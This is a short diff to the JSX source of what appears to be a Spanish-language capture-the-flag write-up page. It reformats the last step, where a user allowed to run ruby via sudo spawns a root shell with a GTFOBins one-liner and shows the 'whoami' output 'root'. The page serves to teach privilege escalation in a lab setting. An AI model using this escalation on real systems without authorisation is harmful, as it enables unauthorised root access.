@@ -204,13 +204,13 @@ User oscar may run the following commands on ee06f232d835:
             <a href="https://gtfobins.github.io/gtfobins/ruby/">GTFOBINS</a>
           </p>
           <p>Luego de leer esto usamos el siguiente comando</p>
-          <CodeBash
-            text={`$ sudo /usr/bin/ruby -e 'exec "/bin/sh"'
-# whoami
-root
-#`}
-          />
+          <CodeBash text={`sudo /usr/bin/ruby -e 'exec "/bin/sh"'`} />
           <p>Y eso es todo!!!! Conseguimos acceso root en la maquina</p>
+          <CodeBash
+            text="# whoami
+root
+#"
+          />
         </div>
       </div>
     </div>
